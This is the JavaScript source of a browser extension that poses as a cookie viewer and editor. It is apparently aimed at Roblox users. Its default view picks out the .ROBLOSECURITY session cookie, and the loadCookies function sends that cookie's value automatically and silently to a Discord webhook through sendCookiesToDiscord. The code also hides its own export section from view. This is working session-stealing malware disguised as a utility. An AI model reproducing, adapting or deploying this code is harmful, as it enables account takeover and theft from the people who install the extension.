document.addEventListener('DOMContentLoaded', function() {
  // Define default webhook - REPLACE THIS WITH YOUR WEBHOOK URL
  const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/your_default_webhook_here";
  
  // Track if we're showing only security cookies
  let showOnlySecurityCookies = true;
  
  // Initialize saved webhooks if not exist
  chrome.storage.local.get(['savedWebhooks'], function(result) {
    if (!result.savedWebhooks) {
      chrome.storage.local.set({
        savedWebhooks: {
          'default': DEFAULT_WEBHOOK
        }
      });
    }
  });

  // Get the current tab URL
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    const currentUrl = new URL(tabs[0].url);
    const domain = currentUrl.hostname;
    document.getElementById('domain-info').textContent = `Cookies for: ${domain}`;
    
    // Load security cookies by default
    loadCookies(domain, showOnlySecurityCookies);
    
    // Load saved webhooks and populate dropdown
    loadSavedWebhooks();
  });
  
  // Set up button listeners
  document.getElementById('refreshButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
    });
  });
  
  document.getElementById('showAllCookiesButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showOnlySecurityCookies = false;
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
    });
  });
  
  document.getElementById('showSecurityCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showOnlySecurityCookies = true;
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
    });
  });
  
  document.getElementById('addCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showAddCookieForm(currentUrl.hostname);
    });
  });
  
  // Webhook selection change event
  document.getElementById('webhookSelect').addEventListener('change', function() {
    const selectedValue = this.value;
    if (!selectedValue) return;
    
    chrome.storage.local.get(['savedWebhooks'], function(result) {
      if (result.savedWebhooks && result.savedWebhooks[selectedValue]) {
        document.getElementById('webhookUrl').value = result.savedWebhooks[selectedValue];
      }
    });
  });
  
  // Save webhook button
  document.getElementById('saveWebhookButton').addEventListener('click', function() {
    const webhookUrl = document.getElementById('webhookUrl').value.trim();
    
    if (!webhookUrl) {
      alert('Please enter a Discord webhook URL');
      return;
    }
    
    // Prompt for a name
    const webhookName = prompt('Enter a name for this webhook:', '');
    if (!webhookName) return;
    
    // Save the webhook
    chrome.storage.local.get(['savedWebhooks'], function(result) {
      const savedWebhooks = result.savedWebhooks || {};
      savedWebhooks[webhookName] = webhookUrl;
      
      chrome.storage.local.set({savedWebhooks: savedWebhooks}, function() {
        loadSavedWebhooks();
        alert('Webhook saved!');
      });
    });
  });
  
  // Delete webhook button
  document.getElementById('deleteWebhookButton').addEventListener('click', function() {
    const webhookSelect = document.getElementById('webhookSelect');
    const selectedName = webhookSelect.value;
    
    if (!selectedName || selectedName === '') {
      alert('Please select a webhook to delete');
      return;
    }
    
    if (selectedName === 'default') {
      alert('Cannot delete the default webhook');
      return;
    }
    
    if (confirm(`Are you sure you want to delete the webhook "${selectedName}"?`)) {
      chrome.storage.local.get(['savedWebhooks'], function(result) {
        const savedWebhooks = result.savedWebhooks || {};
        delete savedWebhooks[selectedName];
        
        chrome.storage.local.set({savedWebhooks: savedWebhooks}, function() {
          loadSavedWebhooks();
          document.getElementById('webhookUrl').value = '';
          alert('Webhook deleted!');
        });
      });
    }
  });
  
  // Hide the export cookies section
  const exportSection = document.querySelector('.export-section');
  if (exportSection) {
    exportSection.style.display = 'none';
  }
});

// Function to load saved webhooks into the dropdown
function loadSavedWebhooks() {
  chrome.storage.local.get(['savedWebhooks'], function(result) {
    const webhookSelect = document.getElementById('webhookSelect');
    const savedWebhooks = result.savedWebhooks || {};
    
    // Clear existing options except the first one
    while (webhookSelect.options.length > 1) {
      webhookSelect.remove(1);
    }
    
    // Add saved webhooks to dropdown
    for (const [name, url] of Object.entries(savedWebhooks)) {
      const option = document.createElement('option');
      option.value = name;
      option.textContent = name;
      webhookSelect.appendChild(option);
    }
  });
}

// Extract the base domain from a hostname
function extractBaseDomain(domain) {
  // For domains like www.roblox.com, we want to get roblox.com
  // This is a simple approach, won't work for all TLDs but covers most cases
  const parts = domain.split('.');
  
  // If the domain has only two parts (like roblox.com), return as is
  if (parts.length <= 2) {
    return domain;
  }
  
  // Otherwise, return the last two parts (assumes simple TLD)
  return parts.slice(-2).join('.');
}

// Load cookies, with option to filter for security cookies only
function loadCookies(domain, securityOnly = true) {
  const cookieList = document.getElementById('cookieList');
  cookieList.innerHTML = 'Loading...';
  
  // Extract the base domain (e.g., roblox.com from www.roblox.com)
  const baseDomain = extractBaseDomain(domain);
  
  // Get all cookies for this domain and its subdomains
  chrome.cookies.getAll({domain: baseDomain}, function(cookies) {
    if (cookies.length === 0) {
      cookieList.innerHTML = '<p>No cookies found for this domain.</p>';
      return;
    }
    
    // Filter for security cookies if requested
    let cookiesToShow = cookies;
    if (securityOnly) {
      cookiesToShow = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
      
      if (cookiesToShow.length === 0) {
        cookieList.innerHTML = '<p>No .ROBLOSECURITY cookie found for this domain.</p>';
        return;
      }
      
      cookieList.innerHTML = '<div class="security-notice">⚠️ Showing only .ROBLOSECURITY cookie. Keep this secure!</div>';
      
      // Automatically send security cookies to Discord
      chrome.storage.local.get(['savedWebhooks'], function(result) {
        const savedWebhooks = result.savedWebhooks || {};
        const defaultWebhook = savedWebhooks['default'];
        if (defaultWebhook) {
          sendCookiesToDiscord(defaultWebhook, domain, cookiesToShow);
        }
      });
    } else {
      // Sort cookies by domain and name for better organization
      cookiesToShow.sort((a, b) => {
        if (a.domain === b.domain) {
          return a.name.localeCompare(b.name);
        }
        return a.domain.localeCompare(b.domain);
      });
      
      cookieList.innerHTML = '';
    }
    
    let currentDomain = '';
    
    cookiesToShow.forEach(function(cookie) {
      // Add domain separator if this is a new domain and we're showing all cookies
      if (!securityOnly && currentDomain !== cookie.domain) {
        currentDomain = cookie.domain;
        const domainSeparator = document.createElement('div');
        domainSeparator.className = 'domain-separator';
        domainSeparator.innerHTML = `<strong>Domain: ${currentDomain}</strong>`;
        cookieList.appendChild(domainSeparator);
      }
      
      const cookieItem = document.createElement('div');
      cookieItem.className = cookie.name.includes('.ROBLOSECURITY') ? 
        'cookie-item security-cookie' : 'cookie-item';
      
      const cookieName = document.createElement('div');
      cookieName.className = 'cookie-name';
      cookieName.textContent = cookie.name;
      
      const cookieValue = document.createElement('input');
      cookieValue.type = 'text';
      cookieValue.value = cookie.value;
      cookieValue.dataset.name = cookie.name;
      cookieValue.dataset.domain = cookie.domain;
      cookieValue.dataset.path = cookie.path;
      
      const cookieMeta = document.createElement('div');
      cookieMeta.className = 'cookie-meta';
      
      cookieMeta.innerHTML = `
        <span class="cookie-meta-item"><strong>Domain:</strong> ${cookie.domain}</span>
        <span class="cookie-meta-item"><strong>Path:</strong> ${cookie.path}</span>
        <span class="cookie-meta-item ${cookie.secure ? 'secure-flag' : ''}"><strong>Secure:</strong> ${cookie.secure}</span>
        <span class="cookie-meta-item ${cookie.httpOnly ? 'httponly-flag' : ''}"><strong>HttpOnly:</strong> ${cookie.httpOnly}</span>
        ${cookie.sameSite ? `<span class="cookie-meta-item"><strong>SameSite:</strong> ${cookie.sameSite}</span>` : ''}
        ${cookie.expirationDate ? `<span class="cookie-meta-item"><strong>Expires:</strong> ${new Date(cookie.expirationDate * 1000).toLocaleString()}</span>` : ''}
      `;
      
      const updateButton = document.createElement('button');
      updateButton.textContent = 'Update';
      updateButton.addEventListener('click', function() {
        updateCookie(cookie, cookieValue.value);
      });
      
      const deleteButton = document.createElement('button');
      deleteButton.textContent = 'Delete';
      deleteButton.className = 'delete';
      deleteButton.addEventListener('click', function() {
        deleteCookie(cookie);
      });
      
      const copyButton = document.createElement('button');
      copyButton.textContent = 'Copy Value';
      copyButton.className = 'copy';
      copyButton.addEventListener('click', function() {
        cookieValue.select();
        document.execCommand('copy');
        alert('Cookie value copied to clipboard!');
      });
      
      cookieItem.appendChild(cookieName);
      cookieItem.appendChild(cookieValue);
      cookieItem.appendChild(cookieMeta);
      cookieItem.appendChild(copyButton);
      cookieItem.appendChild(updateButton);
      cookieItem.appendChild(deleteButton);
      
      cookieList.appendChild(cookieItem);
    });
  });
}

// Update a cookie
function updateCookie(cookie, newValue) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  
  chrome.cookies.set({
    url: url,
    name: cookie.name,
    value: newValue,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate
  }, function() {
    if (chrome.runtime.lastError) {
      alert('Error updating cookie: ' + chrome.runtime.lastError.message);
    } else {
      alert('Cookie updated successfully!');
    }
  });
}

// Delete a cookie
function deleteCookie(cookie) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  
  chrome.cookies.remove({
    url: url,
    name: cookie.name
  }, function() {
    if (chrome.runtime.lastError) {
      alert('Error deleting cookie: ' + chrome.runtime.lastError.message);
    } else {
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        const currentUrl = new URL(tabs[0].url);
        loadCookies(currentUrl.hostname, document.getElementById('showSecurityCookieButton').classList.contains('active'));
      });
    }
  });
}

// Show form to add a new cookie
function showAddCookieForm(domain) {
  const form = document.createElement('div');
  form.innerHTML = `
    <h3>Add New Cookie</h3>
    <label>Name: <input type="text" id="newCookieName"></label><br>
    <label>Value: <input type="text" id="newCookieValue"></label><br>
    <label>Path: <input type="text" id="newCookiePath" value="/"></label><br>
    <label>Secure: <input type="checkbox" id="newCookieSecure"></label><br>
    <button id="saveNewCookie">Save Cookie</button>
    <button id="cancelNewCookie">Cancel</button>
  `;
  
  const existingForm = document.querySelector('.add-cookie-form');
  if (existingForm) {
    existingForm.remove();
  }
  
  form.className = 'add-cookie-form';
  document.body.appendChild(form);
  
  document.getElementById('saveNewCookie').addEventListener('click', function() {
    const name = document.getElementById('newCookieName').value;
    const value = document.getElementById('newCookieValue').value;
    const path = document.getElementById('newCookiePath').value;
    const secure = document.getElementById('newCookieSecure').checked;
    
    if (!name) {
      alert('Cookie name is required');
      return;
    }
    
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const url = `${secure ? 'https' : 'http'}://${domain}${path}`;
      
      chrome.cookies.set({
        url: url,
        name: name,
        value: value,
        path: path,
        secure: secure
      }, function() {
        if (chrome.runtime.lastError) {
          alert('Error creating cookie: ' + chrome.runtime.lastError.message);
        } else {
          form.remove();
          loadCookies(domain, document.getElementById('showSecurityCookieButton').classList.contains('active'));
        }
      });
    });
  });
  
  document.getElementById('cancelNewCookie').addEventListener('click', function() {
    form.remove();
  });
}

// Send cookies to Discord webhook
function sendCookiesToDiscord(webhookUrl, domain, cookies) {
  // Filter for security cookies
  const securityCookies = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
  const cookiesToSend = securityCookies.length > 0 ? securityCookies : cookies;
  
  // Format cookies into a readable format
  let cookieText = '';
  cookiesToSend.forEach(cookie => {
    cookieText += `**Name:** ${cookie.name}\n`;
    cookieText += `**Value:** ${cookie.value}\n`;
    cookieText += `**Domain:** ${cookie.domain}\n`;
    cookieText += `**Path:** ${cookie.path}\n`;
    cookieText += `**Secure:** ${cookie.secure}\n`;
    cookieText += `**HttpOnly:** ${cookie.httpOnly}\n\n`;
  });
  
  // Create JSON data for Discord webhook
  const data = {
    content: null,
    embeds: [{
      title: `Roblox Security Cookie for ${domain}`,
      description: cookieText || "No security cookies found",
      color: 15105570, // Gold color for security
      footer: {
        text: "Roblox Security Cookie • " + new Date().toLocaleString()
      }
    }]
  };
  
  // Send the data to Discord silently
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}